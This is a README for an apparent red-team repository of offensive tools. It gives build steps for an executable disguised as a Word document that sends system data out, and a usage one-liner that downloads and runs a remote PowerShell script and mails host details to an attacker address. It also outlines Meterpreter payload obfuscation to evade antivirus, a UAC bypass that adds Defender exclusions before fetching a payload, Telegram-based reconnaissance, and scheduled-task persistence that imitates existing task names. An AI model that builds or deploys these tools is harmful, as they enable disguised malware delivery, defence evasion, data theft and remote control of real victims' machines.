# Weaponry

A collection of offensive code used for red team engagements. 

### DocumentDupe.cs
```
   C# .NET Executable which exfiltrates system information via publicy-accessible HTTP request inspectors.
   Writes a Word document (Base64-Encoded String) in %TEMP% , and opens via System.Diagnostics.Process.Start
   
  * Use Resource Hacker (http://www.angusj.com/resourcehacker/) to extract the .ico from WINWORD.exe
  
  * Create a new C# Project with Visual Studio. Set project's "Output type" to "Windows Application"
  
  * Under "Resources" in the project's properties, select the icon extracted from WINWORD.exe
  
  * Create a Word document and encode with Base64. (https://base64.guru/converter/encode/file)
  
  * Update variable "doc_b64" in DocumentDupe.cs with Base64 string.
  
  * Update second argument of postdata() with a string containing the URL of a request debugging site. Make sure to check "Make Private" (hookbin.com).
  
  * Compile the Release build of your project for the appropriate architecture.
  
  * Rename .exe in bin/Release to "<Lure_Name>.docx.exe"

```

### OEF.ps1
```
   * Usage: powershell IEX (IWR 'https://raw.githubusercontent.com/jeffjbowie/Weaponry/master/OEF.ps1'); OEF -To "attacker.controlled@email.com"
   
   * Uses an Outlook COM object to send system information to the specified e-mail address:
         - Windows OS, A/V Version, Language, Architecture, Admin?, & External IP.
```

### ObfuscateMeterpeterReverseTcp.py
```
    * Basic shell code loader. (Credit: https://ired.team)

    * Uses subprocess to call MSFVenom, creating a reverse TCP payload with supplied LHOST and LPORT parameters, saving C payload to a temporary file.

    * Loads temporary file, replacing standard variable names with random values of varying lengths, altering static signature of the executable.

    * Outputs modified Meterpeter payload in C for compilation with Visual Studio Community

    TODO: Add in "junk" logic, more anti-debug.

```

### ExclusionDrop.ps1
```
   * Writes Add-MpPreference -ExclusionExtension (".exe", ".dll") to a file in %TEMP%
   
   * Uses SDCLT.exe to escalate privileges and call above script.
   
   * Once EXE &  DLLs are excluded, Meterpreter payload is downloaded + executed.
   
   * Remove PS1 from %TEMP%
   
   * Restore SDCLT.exe functionality.
   ```

### TelegramCanary.ps1
```
   * Grab Username + Domain 
   
   * Grab OS Name, Build #, Processor Architecture
   
   * Grab Local IP 
   
   * Grab External IP from API (ipconfig.me)
   
   * Geolocate external IP from API (ip-api.com)
   
   * Grab user language
   
   * Builds a hashtable of all above values, and encodes to JSON.
   
   * Sends JSON to Telegram API with pre-configured Token + Message ID.
   
 ```
 
 ### SlimLOLC2.ps1
```
   * Check for Mutex in %TEMP%/<mutex_filename>.  If doesn't exist:
   
      * Create %TEMP%/<mutex_filename>
   
      * Create a random file in %TEMP% appended with ".vbs"
   
      * Write VBScript payload to %TEMP%/<random_name>.vbs, which checks an HTTP URL for a Batch/PowerShell command.
      
      * Command is pre-pended with either bat: or ps1:
         ps1:Invoke-Item c:\windows\system32\calc.exe 
   
      * Generates a list of Scheduled Tasks.
      
      * Identifies & duplicates the name of an existing Scheduled Task.
      
      * Creates a scheduled task with modified existing Task Name, executing %TEMP%/<random_name>.vbs every 10 minutes.
      
 ```

